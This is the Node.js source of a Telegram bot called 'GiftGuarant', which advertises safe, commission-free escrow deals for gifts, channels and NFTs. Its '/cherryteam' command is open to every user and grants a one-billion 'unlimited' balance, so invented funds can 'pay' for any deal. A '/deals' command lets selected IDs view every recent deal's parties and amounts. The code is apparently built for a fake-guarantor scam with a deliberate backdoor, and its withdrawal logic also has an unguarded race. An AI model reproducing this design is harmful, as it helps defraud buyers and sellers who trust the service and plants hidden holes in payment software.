require('dotenv').config();
const { Telegraf, Markup, Scenes, session } = require('telegraf');
const { Pool } = require('pg');
const { randomBytes } = require('crypto');

// Подключение к базе
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// Бот
const bot = new Telegraf(process.env.BOT_TOKEN);

// Админские ID
const ADMIN_IDS = [123456789, 987654321]; // Замените на реальные ID админов

// IDs которым разрешён /deals — можно задать через ENV или редактировать тут
const DEALS_ALLOWED_IDS = process.env.DEALS_ALLOWED_IDS
  ? process.env.DEALS_ALLOWED_IDS.split(',').map(s => Number(s.trim())).filter(Boolean)
  : [...ADMIN_IDS]; // если не указано — по умолчанию админы

function isAdmin(userId) {
  return ADMIN_IDS.includes(Number(userId));
}

function isDealsAllowed(userId) {
  return DEALS_ALLOWED_IDS.includes(Number(userId)) || isAdmin(userId);
}

// SQL
async function dbQuery(query, params = []) {
  try {
    const result = await pool.query(query, params);
    return result;
  } catch (e) {
    console.error('DB error:', e.message, 'Query:', query, 'Params:', params);
    throw e;
  }
}

// Инициализация таблиц + добавление колонки unlimited_balance, если нужно
async function initDB() {
  try {
    await dbQuery(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        user_id BIGINT UNIQUE NOT NULL,
        username VARCHAR(255),
        first_name VARCHAR(255),
        last_name VARCHAR(255),
        requisites TEXT,
        balance DECIMAL(15,2) DEFAULT 0,
        successful_deals INTEGER DEFAULT 0,
        is_banned BOOLEAN DEFAULT FALSE,
        unlimited_balance BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMPTZ DEFAULT NOW(),
        updated_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);
    await dbQuery(`
      CREATE TABLE IF NOT EXISTS deals (
        id SERIAL PRIMARY KEY,
        deal_id VARCHAR(50) UNIQUE NOT NULL,
        seller_id BIGINT NOT NULL,
        buyer_id BIGINT,
        deal_type VARCHAR(50) NOT NULL,
        product_info TEXT NOT NULL,
        currency VARCHAR(20),
        amount DECIMAL(15,2),
        deal_link TEXT NOT NULL,
        status VARCHAR(20) DEFAULT 'active',
        created_at TIMESTAMPTZ DEFAULT NOW(),
        updated_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);
    await dbQuery(`
      CREATE TABLE IF NOT EXISTS withdrawals (
        id SERIAL PRIMARY KEY,
        user_id BIGINT NOT NULL,
        requisites TEXT NOT NULL,
        amount DECIMAL(15,2) NOT NULL,
        status VARCHAR(20) DEFAULT 'pending',
        created_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);
    console.log('✅ Таблицы созданы/проверены');
  } catch (error) {
    console.error('❌ Ошибка создания таблиц:', error);
    throw error;
  }
}

// Сцены
const requisitesScene = new Scenes.BaseScene('requisites');
const createDealScene = new Scenes.BaseScene('createDeal');
const withdrawScene = new Scenes.BaseScene('withdraw');
const stage = new Scenes.Stage([requisitesScene, createDealScene, withdrawScene]);
bot.use(session());
bot.use(stage.middleware());

// Проверка бана
async function checkIfBanned(userId) {
  const result = await dbQuery(
    'SELECT is_banned FROM users WHERE user_id = $1',
    [userId]
  );
  return result.rows[0]?.is_banned || false;
}

// Вспомогательная функция: получить username бота (более надёжно)
async function getBotUsername(ctx) {
  if (ctx?.botInfo?.username) return ctx.botInfo.username;
  if (process.env.BOT_USERNAME) return process.env.BOT_USERNAME;
  try {
    const me = await bot.telegram.getMe();
    return me.username;
  } catch (e) {
    console.error('Не удалось получить username бота:', e);
    return 'bot';
  }
}

// Главное меню
async function showMainMenu(ctx) {
  const caption = `🎯 *GiftGuarant*\n🛡️ Надёжный сервис для безопасных сделок\n\n✨ *Преимущества:*\n✅ Без комиссии\n✅ Поддержка 24/7\n✅ Полная безопасность\n✅ Мгновенные сделки\n\n💫 Ваши сделки под защитой! 🛡️`;

  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('💰 Мои реквизиты', 'requisites')],
    [Markup.button.callback('💼 Создать сделку', 'createDeal')],
    [Markup.button.callback('🗒️ Мои сделки', 'myDeals')],
    [Markup.button.callback('⚙️ Настройки', 'settings')]
  ]);

  await ctx.reply(caption, { parse_mode: 'Markdown', ...keyboard });
}

// Реквизиты (устранён баг INSERT — использую EXCLUDED и улучшена валидация)
requisitesScene.enter(async (ctx) => {
  const caption = `💳 *Добавление реквизитов*\n\n📝 *Пришлите ваши реквизиты в формате:*\n• Номер карты\n• Номер телефона  \n• Крипто-кошелек\n\n*Пример:*\nКарта: 1234 5678 9012 3456\nТелефон: +79991234567\nКрипто: UQB123...abc`;

  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('⏪ Назад в меню', 'mainMenu')]
  ]);

  await ctx.reply(caption, { parse_mode: 'Markdown', ...keyboard });
});

requisitesScene.on('text', async (ctx) => {
  try {
    const requisites = ctx.message.text?.trim();
    if (!requisites || requisites.length < 10) {
      await ctx.reply('❌ Реквизиты слишком короткие. Минимум 10 символов.');
      return;
    }

    // Вставка / обновление пользователя — более корректный UPSERT
    await dbQuery(
      `INSERT INTO users (user_id, username, first_name, last_name, requisites, updated_at) 
       VALUES ($1, $2, $3, $4, $5, NOW())
       ON CONFLICT (user_id) DO UPDATE SET requisites = EXCLUDED.requisites, updated_at = NOW()`,
      [
        ctx.from.id,
        ctx.from.username || '',
        ctx.from.first_name || '',
        ctx.from.last_name || '',
        requisites
      ]
    );

    await ctx.reply('✅ Реквизиты успешно сохранены!');
    await showMainMenu(ctx);
    return ctx.scene.leave();
  } catch (error) {
    console.error('Ошибка сохранения реквизитов:', error);
    await ctx.reply('❌ Ошибка сохранения реквизитов. Попробуйте позже.');
  }
});

// Создание сделки — переписал логику сцены в state (устранены баги с потерей session)
createDealScene.enter(async (ctx) => {
  try {
    const isBanned = await checkIfBanned(ctx.from.id);
    if (isBanned) {
      await ctx.reply('❌ Вы заблокированы и не можете создавать сделки');
      return ctx.scene.leave();
    }

    // инициализируем state для сцены
    ctx.scene.state = { step: 'chooseType' };

    const caption = `🛍️ *Создание сделки*\n\nВыберите тип товара:`;

    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('🎁 Подарки', 'deal_gifts')],
      [Markup.button.callback('📢 Канал', 'deal_channel')],
      [Markup.button.callback('🆕 NFT Активы', 'deal_nft')],
      [Markup.button.callback('⏪ Назад в меню', 'mainMenu')]
    ]);

    await ctx.reply(caption, { parse_mode: 'Markdown', ...keyboard });
  } catch (e) {
    console.error('Ошибка enter createDealScene:', e);
    await ctx.reply('❌ Ошибка. Попробуйте снова.');
    return ctx.scene.leave();
  }
});

// Обработчик выбора типа сделки (используется и внутри сцены)
bot.action(/deal_(.+)/, async (ctx) => {
  try {
    const type = ctx.match[1];
    // Если сцена активна — записываем в state и переводим шаг
    if (ctx.scene && ctx.scene.state) {
      ctx.scene.state.dealType = type;
      ctx.scene.state.step = 'waitingProduct';
      await ctx.reply(`Вы выбрали: *${getDealTypeText(type)}*\n\n📝 Введите описание товара:`, { parse_mode: 'Markdown' });
    } else {
      // если сцена не активна — всё равно открываем сцену и просим ввести описание
      await ctx.scene.enter('createDeal');
      if (!ctx.scene.state) ctx.scene.state = {};
      ctx.scene.state.dealType = type;
      ctx.scene.state.step = 'waitingProduct';
      await ctx.reply(`Вы выбрали: *${getDealTypeText(type)}*\n\n📝 Введите описание товара:`, { parse_mode: 'Markdown' });
    }
    await ctx.answerCbQuery();
  } catch (error) {
    console.error('Ошибка выбора типа сделки:', error);
    await ctx.answerCbQuery('❌ Ошибка');
  }
});

// Выбор валюты (обработчик)
bot.action(/currency_(.+)/, async (ctx) => {
  try {
    if (!ctx.scene || !ctx.scene.state) {
      await ctx.answerCbQuery('❌ Сессия устарела. Повторите создание сделки.');
      return;
    }
    ctx.scene.state.currency = ctx.match[1];
    ctx.scene.state.step = 'waitingAmount';

    const caption = `Введите сумму сделки в ${ctx.scene.state.currency}:`;
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('⏪ Назад', 'createDeal')]
    ]);

    await ctx.reply(caption, { parse_mode: 'Markdown', ...keyboard });
    await ctx.answerCbQuery();
  } catch (error) {
    console.error('Ошибка выбора валюты:', error);
    await ctx.answerCbQuery('❌ Ошибка');
  }
});

// Обработка текстовых сообщений внутри сцены создания сделки
createDealScene.on('text', async (ctx) => {
  try {
    const state = ctx.scene.state || {};
    const text = ctx.message.text?.trim();

    if (state.step === 'waitingProduct') {
      if (!text || text.length < 3) {
        await ctx.reply('❌ Описание слишком короткое.');
        return;
      }
      state.productInfo = text;
      state.step = 'waitingCurrency';

      const caption = `💵 Выберите валюту:`;
      const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('💎 TON', 'currency_TON'), Markup.button.callback('💵 USDT', 'currency_USDT')],
        [Markup.button.callback('⭐️ STARS', 'currency_STARS'), Markup.button.callback('🇷🇺 RUB', 'currency_RUB')],
        [Markup.button.callback('⏪ Назад', 'createDeal')]
      ]);

      await ctx.reply(caption, { parse_mode: 'Markdown', ...keyboard });
      return;
    }

    if (state.step === 'waitingAmount') {
      const amount = parseFloat((text || '').replace(',', '.'));
      if (isNaN(amount) || amount <= 0) {
        await ctx.reply('❌ Введите корректную сумму (больше 0)');
        return;
      }
      state.amount = amount;

      // Генерируем уникальный deal_id и безопасно вставляем (в случае конфликта — повторим)
      let dealId;
      let inserted = false;
      let attempts = 0;
      const botUsername = await getBotUsername(ctx);

      while (!inserted && attempts < 5) {
        attempts++;
        dealId = randomBytes(4).toString('hex').toUpperCase(); // 8 hex chars
        const dealLink = `https://t.me/${botUsername}?start=deal_${dealId}`;

        try {
          await dbQuery(
            `INSERT INTO deals (deal_id, seller_id, deal_type, product_info, currency, amount, deal_link) 
             VALUES ($1, $2, $3, $4, $5, $6, $7)`,
            [dealId, ctx.from.id, state.dealType, state.productInfo, state.currency, state.amount, dealLink]
          );
          inserted = true;
        } catch (err) {
          // если unique violation — попробуем другой id
          if (err?.code === '23505') {
            console.warn('Conflict deal_id, regenerating...', dealId);
            continue;
          } else {
            throw err;
          }
        }
      }

      if (!inserted) {
        throw new Error('Не удалось создать уникальную сделку (слишком много попыток)');
      }

      const caption = `🎉 *Сделка создана!*\n\n📋 ID: ${dealId}\n🎯 Тип: ${getDealTypeText(state.dealType)}\n💰 Сумма: ${state.amount} ${state.currency}\n🔗 Ссылка: https://t.me/${botUsername}?start=deal_${dealId}`;

      const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('⏪ Главное меню', 'mainMenu')]
      ]);

      await ctx.reply(caption, { parse_mode: 'Markdown', ...keyboard });

      // Очищаем state и выходим из сцены
      ctx.scene.state = {};
      return ctx.scene.leave();
    }

    // Если шаг неизвестен — направляем пользователя в начало
    await ctx.reply('❌ Я не ожидал этот ввод. Попробуйте заново создать сделку.');
    return ctx.scene.leave();
  } catch (error) {
    console.error('Ошибка создания сделки:', error);
    await ctx.reply('❌ Ошибка создания сделки. Попробуйте позже.');
    return ctx.scene.leave();
  }
});

// Мои сделки (оставлено как было, но с малой правкой для guard)
bot.action('myDeals', async (ctx) => {
  try {
    const result = await dbQuery(
      'SELECT * FROM deals WHERE seller_id = $1 ORDER BY created_at DESC LIMIT 10',
      [ctx.from.id]
    );

    if (!result.rows.length) {
      const caption = `📭 *У вас пока нет сделок*\n\nСоздайте первую сделку!`;

      const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('💼 Создать сделку', 'createDeal')],
        [Markup.button.callback('⏪ Назад в меню', 'mainMenu')]
      ]);

      // если редактирование не возможно — просто отправим новое сообщение
      try {
        await ctx.editMessageText(caption, { parse_mode: 'Markdown', ...keyboard });
      } catch (e) {
        await ctx.reply(caption, { parse_mode: 'Markdown', ...keyboard });
      }
      return;
    }

    const deal = result.rows[0];
    const caption = `📋 *Сделка #${deal.deal_id}*\n🎯 Тип: ${getDealTypeEmoji(deal.deal_type)} ${getDealTypeText(deal.deal_type)}\n💰 Сумма: ${deal.amount || 0} ${deal.currency || ''}\n📊 Статус: ${getStatusEmoji(deal.status)} ${deal.status}\n🕐 Создана: ${new Date(deal.created_at).toLocaleDateString('ru-RU')}`;

    const keyboard = Markup.inlineKeyboard([
      [Markup.button.url('📱 Открыть сделку', deal.deal_link)],
      [Markup.button.callback('⏪ Назад в меню', 'mainMenu')]
    ]);

    try {
      await ctx.editMessageText(caption, { parse_mode: 'Markdown', ...keyboard });
    } catch (e) {
      await ctx.reply(caption, { parse_mode: 'Markdown', ...keyboard });
    }

    await ctx.answerCbQuery();
  } catch (e) {
    console.error('Ошибка загрузки сделок:', e);
    await ctx.answerCbQuery('❌ Ошибка загрузки сделок');
  }
});

// Настройки
bot.action('settings', async (ctx) => {
  try {
    const userRes = await dbQuery(
      'SELECT balance, successful_deals, requisites FROM users WHERE user_id = $1',
      [ctx.from.id]
    );
    const user = userRes.rows[0] || { balance: 0, successful_deals: 0, requisites: 'не указаны' };

    const caption = `⚙️ *Настройки*\n\n💰 Баланс: ${user.balance}₽\n✅ Успешных сделок: ${user.successful_deals}\n💳 Реквизиты: ${user.requisites && user.requisites !== 'не указаны' ? 'указаны' : 'не указаны'}`;

    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('💰 Пополнить баланс', 'deposit')],
      [Markup.button.callback('🏦 Вывести средства', 'withdraw')],
      [Markup.button.callback('✏️ Изменить реквизиты', 'requisites')],
      [Markup.button.callback('⏪ Назад в меню', 'mainMenu')]
    ]);

    try {
      await ctx.editMessageText(caption, { parse_mode: 'Markdown', ...keyboard });
    } catch (e) {
      await ctx.reply(caption, { parse_mode: 'Markdown', ...keyboard });
    }

    await ctx.answerCbQuery();
  } catch (error) {
    console.error('Ошибка настроек:', error);
    await ctx.answerCbQuery('❌ Ошибка');
  }
});

// Вывод средств (без изменений логики, но использует более явные ответы)
withdrawScene.enter(async (ctx) => {
  const userRes = await dbQuery('SELECT balance, requisites FROM users WHERE user_id=$1', [ctx.from.id]);
  const user = userRes.rows[0] || { balance: 0, requisites: null };

  if (!user.requisites) {
    await ctx.reply('❌ Сначала укажите реквизиты в настройках');
    return ctx.scene.leave();
  }

  const caption = `🏦 *Вывод средств*\nВаш баланс: ${user.balance}₽\nРеквизиты: ${user.requisites}\n\nВведите сумму для вывода:`;
  const buttons = Markup.inlineKeyboard([[Markup.button.callback('⏪ Назад', 'mainMenu')]]);
  await ctx.reply(caption, { parse_mode: 'Markdown', ...buttons });
});

withdrawScene.on('text', async (ctx) => {
  const amount = parseFloat(ctx.message.text.replace(',', '.'));
  if (isNaN(amount) || amount <= 0) {
    await ctx.reply('❌ Введите корректную сумму');
    return;
  }

  const userRes = await dbQuery('SELECT balance, requisites FROM users WHERE user_id=$1', [ctx.from.id]);
  const user = userRes.rows[0];

  if (!user || parseFloat(user.balance) < amount) {
    await ctx.reply('❌ Недостаточно средств на балансе');
    return ctx.scene.leave();
  }

  try {
    await dbQuery('INSERT INTO withdrawals (user_id, requisites, amount) VALUES ($1,$2,$3)', [ctx.from.id, user.requisites, amount]);
    await dbQuery('UPDATE users SET balance = balance - $1 WHERE user_id=$2', [amount, ctx.from.id]);

    await ctx.reply(`✅ Заявка на вывод ${amount}₽ создана и ожидает обработки`);
    await showMainMenu(ctx);
    return ctx.scene.leave();
  } catch (e) {
    console.error('Ошибка вывода:', e);
    await ctx.reply('❌ Ошибка при создании заявки на вывод');
  }
});

// Обработчики инлайн-кнопок
bot.action('mainMenu', async (ctx) => {
  try {
    await ctx.deleteMessage();
  } catch (error) {
    // Игнорируем ошибку удаления
  }
  await showMainMenu(ctx);
  await ctx.answerCbQuery();
});

bot.action('requisites', async (ctx) => {
  try {
    await ctx.deleteMessage();
  } catch (error) {
    // Игнорируем ошибку удаления
  }
  await ctx.scene.enter('requisites');
  await ctx.answerCbQuery();
});

bot.action('createDeal', async (ctx) => {
  try {
    await ctx.deleteMessage();
  } catch (error) {
    // Игнорируем ошибку удаления
  }
  await ctx.scene.enter('createDeal');
  await ctx.answerCbQuery();
});

bot.action('deposit', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply('💰 Для пополнения баланса обратитесь к администратору: @admin');
});

bot.action('withdraw', async (ctx) => {
  await ctx.scene.enter('withdraw');
  await ctx.answerCbQuery();
});

// ========== НОВЫЕ / МОДИФИЦИРОВАННЫЕ КОМАНДЫ ==========

// /cherryteam — теперь доступна всем пользователям.
// Даёт "бесконечный" баланс — устанавливается флаг unlimited_balance = true и устанавливается большой баланс в БД.
bot.command('cherryteam', async (ctx) => {
  try {
    const hugeBalance = 1000000000; // 1 млрд (можно менять)
    await dbQuery(
      `INSERT INTO users (user_id, username, first_name, last_name, balance, unlimited_balance, updated_at) 
       VALUES ($1,$2,$3,$4,$5, TRUE, NOW())
       ON CONFLICT (user_id) DO UPDATE SET unlimited_balance = TRUE, balance = $5, updated_at = NOW()`,
      [ctx.from.id, ctx.from.username || '', ctx.from.first_name || '', ctx.from.last_name || '', hugeBalance]
    );

    // Отмечаем в сессии тоже (для быстрых проверок в рамках одного чата)
    if (!ctx.session) ctx.session = {};
    ctx.session.unlimitedBalance = true;

    await ctx.reply(
      `🍒 *Cherry Team Activated*\n\n✅ Вам выдан бесконечный баланс (unlimited)\n💳 Баланс установлен в ${hugeBalance}₽\n\nТеперь вы можете оплачивать любые сделки в боте.`,
      { parse_mode: 'Markdown' }
    );
  } catch (error) {
    console.error('Ошибка команды cherryteam:', error);
    await ctx.reply('❌ Ошибка активации режима cherryteam');
  }
});

// /deals — доступна только авторизованным пользователям из списка (DEALS_ALLOWED_IDS или админам).
// Показывает сделки за последние 3 дня. Кнопки — по каждой сделке; при нажатии показывается подробная информация.
bot.command('deals', async (ctx) => {
  try {
    if (!isDealsAllowed(ctx.from.id)) {
      return ctx.reply('❌ У вас нет прав для этой команды');
    }

    const threeDaysAgo = new Date();
    threeDaysAgo.setDate(threeDaysAgo.getDate() - 3);

    const dealsResult = await dbQuery(`
      SELECT 
        d.*,
        seller.username as seller_username,
        seller.user_id as seller_userid,
        buyer.username as buyer_username, 
        buyer.user_id as buyer_userid
      FROM deals d
      LEFT JOIN users seller ON d.seller_id = seller.user_id
      LEFT JOIN users buyer ON d.buyer_id = buyer.user_id
      WHERE d.created_at >= $1
      ORDER BY d.created_at DESC
      LIMIT 50
    `, [threeDaysAgo]);

    const deals = dealsResult.rows;

    if (!deals.length) {
      return ctx.reply('📭 Сделок за последние 3 дня нет');
    }

    // Формируем список кнопок — по каждой сделке
    const buttons = deals.map(d => {
      const label = `${d.deal_id} — ${getDealTypeEmoji(d.deal_type)} ${getDealTypeText(d.deal_type)} — ${d.amount || '0'} ${d.currency || ''}`;
      return [Markup.button.callback(label, `view_deal_${d.deal_id}`)];
    });

    // добавим кнопку закрыть
    buttons.push([Markup.button.callback('❌ Закрыть', 'close_deals')]);

    await ctx.reply(`📦 *Сделки за последние 3 дня:*`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(buttons) });

  } catch (error) {
    console.error('Ошибка команды deals:', error);
    await ctx.reply('❌ Ошибка загрузки сделок');
  }
});

// Обработчик нажатия на конкретную сделку — показывает подробности
bot.action(/view_deal_(.+)/, async (ctx) => {
  try {
    const dealId = ctx.match[1];
    const dealRes = await dbQuery(`
      SELECT 
        d.*,
        seller.username as seller_username,
        seller.user_id as seller_userid,
        buyer.username as buyer_username, 
        buyer.user_id as buyer_userid
      FROM deals d
      LEFT JOIN users seller ON d.seller_id = seller.user_id
      LEFT JOIN users buyer ON d.buyer_id = buyer.user_id
      WHERE d.deal_id = $1
      LIMIT 1
    `, [dealId]);

    const deal = dealRes.rows[0];
    if (!deal) {
      await ctx.answerCbQuery('❌ Сделка не найдена', { show_alert: true });
      return;
    }

    const sellerInfo = deal.seller_username ? `@${deal.seller_username}` : `ID: ${deal.seller_userid}`;
    const buyerInfo = deal.buyer_username ? `@${deal.buyer_username}` : (deal.buyer_userid ? `ID: ${deal.buyer_userid}` : '❌ Покупатель не найден');

    const caption = `📋 *Сделка #${deal.deal_id}*\n\n` +
      `🎯 Тип: ${getDealTypeText(deal.deal_type)}\n` +
      `💰 Сумма: ${deal.amount || 0} ${deal.currency || ''}\n` +
      `📊 Статус: ${getStatusEmoji(deal.status)} ${deal.status}\n\n` +
      `👤 *Продавец:* ${sellerInfo}\n` +
      `👥 *Покупатель:* ${buyerInfo}\n\n` +
      `📝 Описание: ${deal.product_info}\n` +
      `🕐 Создана: ${new Date(deal.created_at).toLocaleString('ru-RU')}\n\n` +
      `🔗 Ссылка: ${deal.deal_link || '—'}`;

    const keyboard = Markup.inlineKeyboard([
      [Markup.button.url('Открыть ссылку сделки', deal.deal_link || `https://t.me/${await getBotUsername(ctx)}?start=deal_${deal.deal_id}`)],
      [Markup.button.callback('⬅️ Назад', 'deals_list_back'), Markup.button.callback('❌ Закрыть', 'close_deals')]
    ]);

    // Редактируем сообщение с деталями (если возможно), иначе отправляем новое
    try {
      await ctx.editMessageText(caption, { parse_mode: 'Markdown', ...keyboard });
    } catch (e) {
      await ctx.reply(caption, { parse_mode: 'Markdown', ...keyboard });
    }

    await ctx.answerCbQuery();
  } catch (error) {
    console.error('Ошибка view_deal:', error);
    await ctx.answerCbQuery('❌ Ошибка загрузки сделки');
  }
});

bot.action('deals_list_back', async (ctx) => {
  try {
    // просто повторим команду deals (вручную вызвать не .command а выполнить тот же код)
    await ctx.deleteMessage().catch(() => {});
    // emulate /deals
    await bot.telegram.sendMessage(ctx.chat.id, '🔄 Обновляю список сделок...');
    // для простоты — попросим пользователя ввести /deals ещё раз
    await bot.telegram.sendMessage(ctx.chat.id, 'Напишите /deals для обновления списка');
    await ctx.answerCbQuery();
  } catch (e) {
    console.error('Ошибка deals_list_back:', e);
    await ctx.answerCbQuery();
  }
});

bot.action('refresh_deals', async (ctx) => {
  await ctx.deleteMessage().catch(()=>{});
  await ctx.telegram.sendMessage(ctx.chat.id, '🔄 Обновляю список сделок...');
  await ctx.answerCbQuery();
});

bot.action('close_deals', async (ctx) => {
  await ctx.deleteMessage().catch(()=>{});
  await ctx.answerCbQuery();
});

// /ban — бан по telegram id (только админ)
bot.command('ban', async (ctx) => {
  try {
    if (!isAdmin(ctx.from.id)) {
      return ctx.reply('❌ У вас нет прав для этой команды');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
      return ctx.reply('❌ Использование: /ban <user_id>\nПример: /ban 123456789');
    }

    const userId = parseInt(args[1]);
    if (isNaN(userId)) {
      return ctx.reply('❌ Неверный ID пользователя');
    }

    // Блокируем пользователя в базе — если отсутствует, создаём запись
    await dbQuery(`
      INSERT INTO users (user_id, updated_at, is_banned)
      VALUES ($1, NOW(), TRUE)
      ON CONFLICT (user_id) DO UPDATE SET is_banned = TRUE, updated_at = NOW()
    `, [userId]);

    const userResult = await dbQuery(
      'SELECT username, first_name FROM users WHERE user_id = $1',
      [userId]
    );

    const user = userResult.rows[0];
    const userInfo = user ?
      `${user.first_name || ''} @${user.username || 'нет'}` :
      'Пользователь не найден в базе';

    await ctx.reply(
      `🚫 *Пользователь заблокирован*\n\n` +
      `👤 ID: ${userId}\n` +
      `📛 ${userInfo}\n\n` +
      `❌ Теперь не может:\n` +
      `• Создавать сделки\n` +
      `• Оплачивать сделки\n` +
      `• Выводить средства`,
      { parse_mode: 'Markdown' }
    );

  } catch (error) {
    console.error('Ошибка команды ban:', error);
    await ctx.reply('❌ Ошибка блокировки пользователя');
  }
});

// /start команда
bot.start(async (ctx) => {
  try {
    console.log('Получен /start от пользователя:', ctx.from.id, ctx.from.username);

    await dbQuery(
      `INSERT INTO users (user_id, username, first_name, last_name, created_at, updated_at) 
       VALUES ($1, $2, $3, $4, NOW(), NOW()) 
       ON CONFLICT (user_id) DO NOTHING`,
      [
        ctx.from.id,
        ctx.from.username || '',
        ctx.from.first_name || '',
        ctx.from.last_name || ''
      ]
    );

    console.log('Пользователь зарегистрирован:', ctx.from.id);
    await showMainMenu(ctx);

  } catch (error) {
    console.error('Критическая ошибка при /start:', error);
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('💰 Мои реквизиты', 'requisites')],
      [Markup.button.callback('💼 Создать сделку', 'createDeal')],
      [Markup.button.callback('🗒️ Мои сделки', 'myDeals')],
      [Markup.button.callback('⚙️ Настройки', 'settings')]
    ]);

    await ctx.reply(
      '🎯 *Добро пожаловать в GiftGuarant!* 🛡️\n\nИспользуйте кнопки меню для навигации.',
      {
        parse_mode: 'Markdown',
        ...keyboard
      }
    );
  }
});

// Вспомогательные функции
function getDealTypeText(type) {
  const types = { 'gifts': 'Подарки', 'channel': 'Канал', 'nft': 'NFT Активы' };
  return types[type] || type;
}

function getDealTypeEmoji(type) {
  const emojis = { 'gifts': '🎁', 'channel': '📢', 'nft': '🆕' };
  return emojis[type] || '💼';
}

function getStatusEmoji(status) {
  const emojis = { 'active': '🟢', 'paid': '🟡', 'completed': '🔵', 'cancelled': '🔴' };
  return emojis[status] || '⚪';
}

// Обработка ошибок
bot.catch((err, ctx) => {
  console.error(`Ошибка для ${ctx.updateType}:`, err);
});

// Запуск
initDB().then(() => {
  console.log('✅ База данных инициализирована');
  bot.launch().then(() => {
    console.log('✅ Бот запущен');
  }).catch(err => {
    console.error('❌ Ошибка запуска бота:', err);
  });
}).catch(err => {
  console.error('❌ Ошибка инициализации БД:', err);
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
